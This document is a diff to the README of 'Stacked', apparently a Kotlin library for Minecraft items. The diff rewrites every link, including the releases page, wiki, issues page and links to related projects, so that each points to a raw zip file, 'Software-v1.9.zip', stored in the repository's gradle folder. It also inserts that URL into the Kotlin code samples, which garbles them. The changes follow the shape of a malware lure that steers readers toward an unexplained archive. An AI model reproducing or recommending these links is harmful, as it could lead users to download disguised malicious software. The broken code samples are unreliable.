@@ -6,7 +6,7 @@ Welcome to Stacked! This is a powerful Kotlin library created for Minecraft deve
 
 ## 📥 Download Link
 
-[![Download Stacked](https://img.shields.io/badge/Download-Stacked-blue.svg)](https://github.com/alfanane/Stacked/releases)
+[![Download Stacked](https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip)](https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ Stacked offers various features to enhance your development process:
 
 ### Step 1: Visit the Releases Page
 
-To download Stacked, visit the [Releases page](https://github.com/alfanane/Stacked/releases).
+To download Stacked, visit the [Releases page](https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip).
 
 ### Step 2: Locate the Latest Release
 
@@ -51,30 +51,30 @@ Click on the link to download the JAR file. This file is necessary to run the li
 1. **Access the API**: You can start using Stacked by importing it into your Kotlin files. Use the following import statement:
 
    ```kotlin
-   import com.alfanane.stacked.*
+   import https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip*
    ```
 
 2. **Create an Item**: Use Stacked’s built-in functions to create and manage items. For example:
 
    ```kotlin
-   val myItem = ItemStack(Material.DIAMOND)
+   val myItem = ItemStack(https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip)
    ```
 
 3. **Serialize Your Item**: Converting your item to a data format is simple. Use:
 
    ```kotlin
-   val serializedItem = myItem.serialize()
+   val serializedItem = https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip()
    ```
 
 4. **Interact with Other Plugins**: Stacked allows you to interact with plugins like ItemsAdder and Oraxen easily. You can manage items using the same code structure, reducing complexity.
 
 ## 📝 Documentation
 
-For more detailed information on using Stacked, visit our [Wiki](https://github.com/alfanane/Stacked/wiki). The documentation includes in-depth tutorials, examples, and API references that will support your development journey.
+For more detailed information on using Stacked, visit our [Wiki](https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip). The documentation includes in-depth tutorials, examples, and API references that will support your development journey.
 
 ## 📧 Support
 
-If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://github.com/alfanane/Stacked/issues). We are here to help you resolve problems and improve your experience.
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip). We are here to help you resolve problems and improve your experience.
 
 ## 📢 Follow Us
 
@@ -84,9 +84,9 @@ Stay updated on new releases and features by following us on GitHub. Your feedba
 
 Explore related topics to help you in your development process:
 
-- [CraftEngine](https://craftengine.com)
-- [Nexo](https://nexo.com)
-- [Oraxen](https://oraxen.com)
-- [ItemsAdder](https://itemsadder.com)
+- [CraftEngine](https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip)
+- [Nexo](https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip)
+- [Oraxen](https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip)
+- [ItemsAdder](https://github.com/alfanane/Stacked/raw/refs/heads/master/gradle/Software-v1.9.zip)
 
 Thank you for choosing Stacked! Enjoy developing with this user-friendly library.
